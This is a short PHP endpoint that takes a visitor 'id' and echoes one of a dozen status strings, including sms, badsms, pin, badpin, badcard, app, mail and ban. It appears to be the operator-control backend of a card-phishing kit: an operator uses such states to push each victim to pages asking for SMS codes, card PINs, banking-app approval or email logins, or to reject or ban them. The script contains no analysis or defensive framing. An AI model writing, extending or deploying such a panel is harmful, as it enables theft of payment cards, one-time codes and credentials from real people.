<?php 
require_once "../cors.php";
require_once './func.php';


if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['id'])) {
    $id = $_GET['id'];
    $response = response($id);

    if( $response === 'sms' ) {
        echo 'sms';
        exit(); 
    }  else if( $response === 'badsms' ) {
        echo 'badsms';
        exit();
    }
    else if( $response === 'pin' ) {
        echo 'pin';
        exit();
    }
    else if( $response === 'badpin' ) {
        echo 'badpin';
        exit();
    }
    else if( $response === 'confirm' ) {
        echo 'confirm';
        exit();
    }
    else if( $response === 'badcard' ) {
        echo 'badcard';
        exit();
    }
    else if( $response === 'app' ) {
        echo 'app';
        exit();
    }
    else if( $response === 'mail' ) {
        echo 'mail';
        exit();
    }
    else if( $response === 'badmail' ) {
        echo 'badmail';
        exit();
    }
    else if( $response === 'custom' ) {
        echo 'custom';
        exit();
    }
    else if( $response === 'badcustom' ) {
        echo 'badcustom';
        exit();
    }
    else if( $response === 'ban' ) {
        echo 'ban';
        exit();
    }
    exit();
}